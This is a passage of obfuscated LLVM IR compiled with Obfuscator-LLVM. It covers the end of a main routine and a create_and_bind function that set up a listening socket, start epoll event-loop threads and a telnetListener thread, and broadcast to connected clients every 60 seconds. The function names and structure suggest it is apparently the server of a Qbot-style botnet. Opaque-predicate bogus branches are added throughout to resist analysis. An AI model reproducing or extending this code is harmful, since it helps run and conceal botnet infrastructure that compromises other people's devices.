  %122 = sub i32 %120, 1
  %123 = mul i32 %120, %122
  %124 = urem i32 %123, 2
  %125 = icmp eq i32 %124, 0
  %126 = icmp slt i32 %121, 10
  %127 = or i1 %125, %126
  br i1 %127, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %119
  call void @abort() #10
  %128 = load i32, i32* @x.21
  %129 = load i32, i32* @y.22
  %130 = sub i32 %128, 1
  %131 = mul i32 %128, %130
  %132 = urem i32 %131, 2
  %133 = icmp eq i32 %132, 0
  %134 = icmp slt i32 %129, 10
  %135 = or i1 %133, %134
  br i1 %135, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  unreachable

; <label>:136:                                    ; preds = %originalBBpart212
  %137 = load i32, i32* @x.21
  %138 = load i32, i32* @y.22
  %139 = sub i32 %137, 1
  %140 = mul i32 %137, %139
  %141 = urem i32 %140, 2
  %142 = icmp eq i32 %141, 0
  %143 = icmp slt i32 %138, 10
  %144 = or i1 %142, %143
  br i1 %144, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %136
  %145 = load volatile i32, i32* @listenFD, align 4
  %146 = call i32 @listen(i32 %145, i32 128) #7
  store i32 %146, i32* %16, align 4
  %147 = load i32, i32* %16, align 4
  %148 = icmp eq i32 %147, -1
  %149 = load i32, i32* @x.21
  %150 = load i32, i32* @y.22
  %151 = sub i32 %149, 1
  %152 = mul i32 %149, %151
  %153 = urem i32 %152, 2
  %154 = icmp eq i32 %153, 0
  %155 = icmp slt i32 %150, 10
  %156 = or i1 %154, %155
  br i1 %156, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %148, label %157, label %158

; <label>:157:                                    ; preds = %originalBBpart220
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.216, i32 0, i32 0))
  call void @abort() #10
  unreachable

; <label>:158:                                    ; preds = %originalBBpart220
  %159 = call i32 @epoll_create1(i32 0) #7
  store volatile i32 %159, i32* @epollFD, align 4
  %160 = load volatile i32, i32* @epollFD, align 4
  %161 = icmp eq i32 %160, -1
  br i1 %161, label %162, label %163

; <label>:162:                                    ; preds = %158
  call void @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.217, i32 0, i32 0))
  call void @abort() #10
  unreachable

; <label>:163:                                    ; preds = %158
  %164 = load volatile i32, i32* @listenFD, align 4
  %165 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %19, i32 0, i32 1
  %166 = bitcast %union.epoll_data* %165 to i32*
  store i32 %164, i32* %166, align 1
  %167 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %19, i32 0, i32 0
  store i32 -2147483647, i32* %167, align 1
  %168 = load volatile i32, i32* @epollFD, align 4
  %169 = load volatile i32, i32* @listenFD, align 4
  %170 = call i32 @epoll_ctl(i32 %168, i32 1, i32 %169, %struct.epoll_event* %19) #7
  store i32 %170, i32* %16, align 4
  %171 = load i32, i32* %16, align 4
  %172 = icmp eq i32 %171, -1
  br i1 %172, label %173, label %190

; <label>:173:                                    ; preds = %163
  %174 = load i32, i32* @x.21
  %175 = load i32, i32* @y.22
  %176 = sub i32 %174, 1
  %177 = mul i32 %174, %176
  %178 = urem i32 %177, 2
  %179 = icmp eq i32 %178, 0
  %180 = icmp slt i32 %175, 10
  %181 = or i1 %179, %180
  br i1 %181, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %173
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.2, i32 0, i32 0))
  call void @abort() #10
  %182 = load i32, i32* @x.21
  %183 = load i32, i32* @y.22
  %184 = sub i32 %182, 1
  %185 = mul i32 %182, %184
  %186 = urem i32 %185, 2
  %187 = icmp eq i32 %186, 0
  %188 = icmp slt i32 %183, 10
  %189 = or i1 %187, %188
  br i1 %189, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  unreachable

; <label>:190:                                    ; preds = %163
  %191 = load i32, i32* @x.21
  %192 = load i32, i32* @y.22
  %193 = sub i32 %191, 1
  %194 = mul i32 %191, %193
  %195 = urem i32 %194, 2
  %196 = icmp eq i32 %195, 0
  %197 = icmp slt i32 %192, 10
  %198 = or i1 %196, %197
  br i1 %198, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %190
  %199 = load i32, i32* %17, align 4
  %200 = add nsw i32 %199, 2
  %201 = zext i32 %200 to i64
  %202 = call i8* @llvm.stacksave()
  store i8* %202, i8** %20, align 8
  %203 = alloca i64, i64 %201, align 16
  %204 = load i32, i32* @x.21
  %205 = load i32, i32* @y.22
  %206 = sub i32 %204, 1
  %207 = mul i32 %204, %206
  %208 = urem i32 %207, 2
  %209 = icmp eq i32 %208, 0
  %210 = icmp slt i32 %205, 10
  %211 = or i1 %209, %210
  br i1 %211, label %originalBBpart232, label %originalBB26alteredBB

originalBBpart232:                                ; preds = %originalBB26
  br label %212

; <label>:212:                                    ; preds = %216, %originalBBpart232
  %213 = load i32, i32* %17, align 4
  %214 = add nsw i32 %213, -1
  store i32 %214, i32* %17, align 4
  %215 = icmp ne i32 %213, 0
  br i1 %215, label %216, label %222

; <label>:216:                                    ; preds = %212
  %217 = load i32, i32* %17, align 4
  %218 = add nsw i32 %217, 1
  %219 = sext i32 %218 to i64
  %220 = getelementptr inbounds i64, i64* %203, i64 %219
  %221 = call i32 @pthread_create(i64* %220, %union.pthread_attr_t* null, i8* (i8*)* @epollEventLoop, i8* null) #7
  br label %212

; <label>:222:                                    ; preds = %212
  %223 = getelementptr inbounds i64, i64* %203, i64 0
  %224 = load i32, i32* %18, align 4
  %225 = sext i32 %224 to i64
  %226 = inttoptr i64 %225 to i8*
  %227 = call i32 @pthread_create(i64* %223, %union.pthread_attr_t* null, i8* (i8*)* bitcast (i8* (i32)* @telnetListener to i8* (i8*)*), i8* %226) #7
  br label %228

; <label>:228:                                    ; preds = %229, %222
  br label %229

; <label>:229:                                    ; preds = %228
  call void @broadcast(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i32 -1, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.218, i32 0, i32 0))
  %230 = call i32 @sleep(i32 60)
  br label %228

originalBBalteredBB:                              ; preds = %originalBB, %3
  %231 = alloca i32, align 4
  %232 = alloca i32, align 4
  %233 = alloca i8**, align 8
  %234 = alloca i8**, align 8
  %235 = alloca i32, align 4
  %236 = alloca i32, align 4
  %237 = alloca i32, align 4
  %238 = alloca %struct.epoll_event, align 1
  %239 = alloca i8*, align 8
  store i32 0, i32* %231, align 4
  store i32 %0, i32* %232, align 4
  store i8** %1, i8*** %233, align 8
  store i8** %2, i8*** %234, align 8
  %240 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #7
  %241 = load i32, i32* %232, align 4
  %242 = icmp ne i32 %241, 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %51
  %243 = load i32, i32* %17, align 4
  %244 = icmp slt i32 %243, 1000
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %72
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %98
  %245 = load volatile i32, i32* @listenFD, align 4
  %246 = call i32 @make_socket_non_blocking(i32 %245)
  store i32 %246, i32* %16, align 4
  %247 = load i32, i32* %16, align 4
  %248 = icmp eq i32 %247, -1
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %119
  call void @abort() #10
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %136
  %249 = load volatile i32, i32* @listenFD, align 4
  %250 = call i32 @listen(i32 %249, i32 128) #7
  store i32 %250, i32* %16, align 4
  %251 = load i32, i32* %16, align 4
  %252 = icmp eq i32 %251, -1
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %173
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.2, i32 0, i32 0))
  call void @abort() #10
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %190
  %253 = load i32, i32* %17, align 4
  %_ = sub i32 %253, 2
  %gen = mul i32 %_, 2
  %_27 = shl i32 %253, 2
  %_28 = shl i32 %253, 2
  %_29 = sub i32 0, %253
  %gen30 = add i32 %_29, 2
  %254 = add nsw i32 %253, 2
  %255 = zext i32 %254 to i64
  %256 = call i8* @llvm.stacksave()
  store i8* %256, i8** %20, align 8
  %257 = alloca i64, i64 %255, align 16
  br label %originalBB26
}

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #3

; Function Attrs: noreturn nounwind
declare void @exit(i32) #6

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #2

; Function Attrs: noinline nounwind uwtable
define internal i32 @create_and_bind(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct.addrinfo, align 8
  %5 = alloca %struct.addrinfo*, align 8
  %6 = alloca %struct.addrinfo*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  %10 = bitcast %struct.addrinfo* %4 to i8*
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 48, i32 8, i1 false)
  %11 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 1
  store i32 0, i32* %11, align 4
  %12 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 2
  store i32 1, i32* %12, align 8
  %13 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 0
  store i32 1, i32* %13, align 8
  %14 = load i8*, i8** %3, align 8
  %15 = call i32 @getaddrinfo(i8* null, i8* %14, %struct.addrinfo* %4, %struct.addrinfo** %5)
  store i32 %15, i32* %7, align 4
  %16 = load i32, i32* %7, align 4
  %17 = icmp ne i32 %16, 0
  br i1 %17, label %18, label %23

; <label>:18:                                     ; preds = %1
  %19 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %20 = load i32, i32* %7, align 4
  %21 = call i8* @gai_strerror(i32 %20) #7
  %22 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %19, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.220, i32 0, i32 0), i8* %21)
  store i32 -1, i32* %2, align 4
  br label %156

; <label>:23:                                     ; preds = %1
  %24 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  store %struct.addrinfo* %24, %struct.addrinfo** %6, align 8
  br label %25

; <label>:25:                                     ; preds = %originalBBpart212, %23
  %26 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %27 = icmp ne %struct.addrinfo* %26, null
  br i1 %27, label %28, label %131

; <label>:28:                                     ; preds = %25
  %29 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %30 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %29, i32 0, i32 1
  %31 = load i32, i32* %30, align 4
  %32 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %33 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %32, i32 0, i32 2
  %34 = load i32, i32* %33, align 8
  %35 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %36 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %35, i32 0, i32 3
  %37 = load i32, i32* %36, align 4
  %38 = call i32 @socket(i32 %31, i32 %34, i32 %37) #7
  store i32 %38, i32* %8, align 4
  %39 = load i32, i32* %8, align 4
  %40 = icmp eq i32 %39, -1
  br i1 %40, label %41, label %58

; <label>:41:                                     ; preds = %28
  %42 = load i32, i32* @x.23
  %43 = load i32, i32* @y.24
  %44 = sub i32 %42, 1
  %45 = mul i32 %42, %44
  %46 = urem i32 %45, 2
  %47 = icmp eq i32 %46, 0
  %48 = icmp slt i32 %43, 10
  %49 = or i1 %47, %48
  br i1 %49, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %41
  %50 = load i32, i32* @x.23
  %51 = load i32, i32* @y.24
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %111

; <label>:58:                                     ; preds = %28
  %59 = load i32, i32* @x.23
  %60 = load i32, i32* @y.24
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %58
  store i32 1, i32* %9, align 4
  %67 = load i32, i32* %8, align 4
  %68 = bitcast i32* %9 to i8*
  %69 = call i32 @setsockopt(i32 %67, i32 1, i32 2, i8* %68, i32 4) #7
  %70 = icmp eq i32 %69, -1
  %71 = load i32, i32* @x.23
  %72 = load i32, i32* @y.24
  %73 = sub i32 %71, 1
  %74 = mul i32 %71, %73
  %75 = urem i32 %74, 2
  %76 = icmp eq i32 %75, 0
  %77 = icmp slt i32 %72, 10
  %78 = or i1 %76, %77
  br i1 %78, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %70, label %79, label %80

; <label>:79:                                     ; preds = %originalBBpart24
  call void @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.221, i32 0, i32 0))
  br label %80

; <label>:80:                                     ; preds = %79, %originalBBpart24
  %81 = load i32, i32* %8, align 4
  %82 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %83 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %82, i32 0, i32 5
  %84 = load %struct.sockaddr*, %struct.sockaddr** %83, align 8
  %85 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %86 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %85, i32 0, i32 4
  %87 = load i32, i32* %86, align 8
  %88 = call i32 @bind(i32 %81, %struct.sockaddr* %84, i32 %87) #7
  store i32 %88, i32* %7, align 4
  %89 = load i32, i32* %7, align 4
  %90 = icmp eq i32 %89, 0
  br i1 %90, label %91, label %108

; <label>:91:                                     ; preds = %80
  %92 = load i32, i32* @x.23
  %93 = load i32, i32* @y.24
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %91
  %100 = load i32, i32* @x.23
  %101 = load i32, i32* @y.24
  %102 = sub i32 %100, 1
  %103 = mul i32 %100, %102
  %104 = urem i32 %103, 2
  %105 = icmp eq i32 %104, 0
  %106 = icmp slt i32 %101, 10
  %107 = or i1 %105, %106
  br i1 %107, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %131

; <label>:108:                                    ; preds = %80
  %109 = load i32, i32* %8, align 4
  %110 = call i32 @close(i32 %109)
  br label %111

; <label>:111:                                    ; preds = %108, %originalBBpart2
  %112 = load i32, i32* @x.23
  %113 = load i32, i32* @y.24
  %114 = sub i32 %112, 1
  %115 = mul i32 %112, %114
  %116 = urem i32 %115, 2
  %117 = icmp eq i32 %116, 0
  %118 = icmp slt i32 %113, 10
  %119 = or i1 %117, %118
  br i1 %119, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %111
  %120 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %121 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %120, i32 0, i32 7
  %122 = load %struct.addrinfo*, %struct.addrinfo** %121, align 8
  store %struct.addrinfo* %122, %struct.addrinfo** %6, align 8
  %123 = load i32, i32* @x.23
  %124 = load i32, i32* @y.24
  %125 = sub i32 %123, 1
  %126 = mul i32 %123, %125
  %127 = urem i32 %126, 2
  %128 = icmp eq i32 %127, 0
  %129 = icmp slt i32 %124, 10
  %130 = or i1 %128, %129
  br i1 %130, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %25

; <label>:131:                                    ; preds = %originalBBpart28, %25
  %132 = load i32, i32* @x.23
  %133 = load i32, i32* @y.24
  %134 = sub i32 %132, 1
  %135 = mul i32 %132, %134
  %136 = urem i32 %135, 2
  %137 = icmp eq i32 %136, 0
  %138 = icmp slt i32 %133, 10
  %139 = or i1 %137, %138
  br i1 %139, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %131
  %140 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %141 = icmp eq %struct.addrinfo* %140, null
  %142 = load i32, i32* @x.23
  %143 = load i32, i32* @y.24
  %144 = sub i32 %142, 1
  %145 = mul i32 %142, %144
  %146 = urem i32 %145, 2
  %147 = icmp eq i32 %146, 0
  %148 = icmp slt i32 %143, 10
  %149 = or i1 %147, %148
  br i1 %149, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %141, label %150, label %153

; <label>:150:                                    ; preds = %originalBBpart216
  %151 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %152 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %151, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.222, i32 0, i32 0))
  store i32 -1, i32* %2, align 4
  br label %156

; <label>:153:                                    ; preds = %originalBBpart216
  %154 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  call void @freeaddrinfo(%struct.addrinfo* %154) #7
  %155 = load i32, i32* %8, align 4
  store i32 %155, i32* %2, align 4
  br label %156

; <label>:156:                                    ; preds = %153, %150, %18
  %157 = load i32, i32* %2, align 4
  ret i32 %157

originalBBalteredBB:                              ; preds = %originalBB, %41
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %58
  store i32 1, i32* %9, align 4
  %158 = load i32, i32* %8, align 4
  %159 = bitcast i32* %9 to i8*
  %160 = call i32 @setsockopt(i32 %158, i32 1, i32 2, i8* %159, i32 4) #7
  %161 = icmp eq i32 %160, -1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %91
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %111
  %162 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %163 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %162, i32 0, i32 7
  %164 = load %struct.addrinfo*, %struct.addrinfo** %163, align 8
  store %struct.addrinfo* %164, %struct.addrinfo** %6, align 8
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %131
  %165 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %166 = icmp eq %struct.addrinfo* %165, null
  br label %originalBB14
}

; Function Attrs: noreturn nounwind
declare void @abort() #6

; Function Attrs: nounwind
declare i32 @epoll_create1(i32) #3

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #7

declare i32 @getaddrinfo(i8*, i8*, %struct.addrinfo*, %struct.addrinfo**) #1

; Function Attrs: nounwind
declare i8* @gai_strerror(i32) #3

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #3

; Function Attrs: nounwind
declare void @freeaddrinfo(%struct.addrinfo*) #3

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { argmemonly nounwind }
attributes #5 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { nounwind }
attributes #8 = { nounwind readonly }
attributes #9 = { nounwind readnone }
attributes #10 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
